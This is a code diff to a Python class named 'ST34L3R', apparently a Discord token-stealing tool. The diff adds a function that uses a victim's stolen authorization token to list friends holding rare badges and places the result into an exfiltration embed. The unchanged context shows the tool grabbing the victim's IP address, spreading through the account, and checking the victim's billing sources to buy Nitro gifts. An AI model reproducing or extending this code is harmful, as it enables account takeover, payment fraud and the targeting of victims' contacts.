@@ -60,6 +60,32 @@ class ST34L3R():
             return requests.get("https://api.ipify.org").text
         except:
             return
+        
+    def RareFriend(self, token):
+        friends = ""
+        try:
+            req = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={"content-type": "application/json", "authorization": token}).json()
+            
+            for user in req:
+                badge = ""
+                if user["user"]["public_flags"] == 1:badge = "Staff"
+                elif user["user"]["public_flags"] == 2:badge = "Partner"
+                elif user["user"]["public_flags"] == 4:badge = "Hypesquad Events"
+                elif user["user"]["public_flags"] == 8:badge = "BugHunter 1"
+                elif user["user"]["public_flags"] == 512:badge = "Early"
+                elif user["user"]["public_flags"] == 16384:badge = "BugHunter 2"
+                elif user["user"]["public_flags"] == 131072:badge = "Developer"
+                else:badge = ""
+                
+                if badge != "":
+                    friends += badge + " | " + user['id'] + "\n"
+            
+            if friends == "":
+                friends += "No Rare Friends"
+            
+            return friends
+        except:
+            return "None, Except Error"
 
     def spread(self, token, status):
         try:
@@ -73,7 +99,7 @@ class ST34L3R():
         except:
             return None
     
-    def buy_nitro(token):
+    def buy_nitro(self, token):
         try:
             r = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token})
             if r.status_code == 200:
@@ -140,6 +166,10 @@ class ST34L3R():
                         {
                             "name": "__**Nitro Buy:**__",
                             "value": f"https://discord.gift/" + self.buy_nitro()
+                        },
+                        {
+                            "name": "__**Rare Friends:**__",
+                            "value": f"```{self.RareFriend(token)}```"
                         }
                     ],
                     "author": {
